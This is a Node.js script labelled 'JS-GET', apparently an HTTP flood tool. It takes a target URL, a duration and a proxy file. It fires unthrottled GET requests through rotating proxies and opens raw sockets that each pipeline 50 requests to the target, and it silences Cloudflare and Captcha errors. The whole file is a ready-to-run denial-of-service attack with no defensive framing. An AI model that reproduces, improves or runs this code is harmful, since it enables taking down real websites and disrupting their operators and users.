/**

*/

const events = require("events");
const fs = require("fs");
var colors = require("colors");
var path = require("path");
var filename = path.basename(__filename);

const url = require("url");
var request = require("request");

(ignoreNames = ["RequestError", "StatusCodeError", "CaptchaError", "CloudflareError", "ParseError", "ParserError", "statusCode", "TypeError"]),
    (ignoreCodes = ["ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED", "EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "ESOCKETTIMEDOUT", "EPROTO"]);

process
    .on("uncaughtException", function (e) {
        if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return !1;
        console.warn(e);
    })
    .on("unhandledRejection", function (e) {
        if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return !1;
        console.warn(e);
    })
    .on("warning", (e) => {
        if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return !1;
        console.warn(e);
    })
    .setMaxListeners(0);

events.EventEmitter.defaultMaxListeners = Infinity;
events.EventEmitter.prototype._maxListeners = Infinity;

setTimeout(function () {
    process.exit(1);
}, process.argv[3] * 1000);

const proxies = fs.readFileSync(process.argv[4], 'utf-8').replace(/\r/g, '').split('\n');

    console.log("JS-GET ".rainbow.bold + "|" + " Created by Lex".white.bold);
    if (process.argv.length <= 3) {
        console.log("Usage: node ".white + filename.white.bold + " <url> <time> <proxy>".white.bold);
        process.exit(-1);
    }
    console.log("Starting script: ".magenta.bold + filename.white.bold);
    console.log(colors.white.bold("%s Proxies Loaded."), proxies.length);

    var site = process.argv[2];
    var ua = "";
    var host = url.parse(site).host;
    var target = process.argv[2];

    setInterval(() => {
        let proxy = proxies[Math.floor(Math.random() * proxies.length)];
        request.get(
            {
                url: target,
                proxy: "http://" + proxy,
            },
            function (error, response) {
                console.log(response.statusCode);
                if (error) {
                } else {
                    var parsed = JSON.parse(JSON.stringify(response));
                    ua = parsed["request"]["headers"]["User-Agent"];
                }
            }
        );
    });

    var site = site.replace("https", "http");
    var int = setInterval(() => {
        if (ua !== "") {
            var socket = require("net").Socket();
            socket.connect(80, host);
            socket.setTimeout(10000);
            for (var i = 0; i < 50; i++) {
                socket.write(
                    "GET " +
                        site +
                        "/ HTTP/1.1\r\nHost: " +
                        host +
                        "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: " +
                        ua +
                        "\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n"
                );
            }
            socket.on("data", function () {
                setTimeout(function () {
                    socket.destroy();
                    return delete socket;
                }, 5000);
            });
        }
    });
//console.log("Attack has been sent for %s seconds", process.argv[3]);
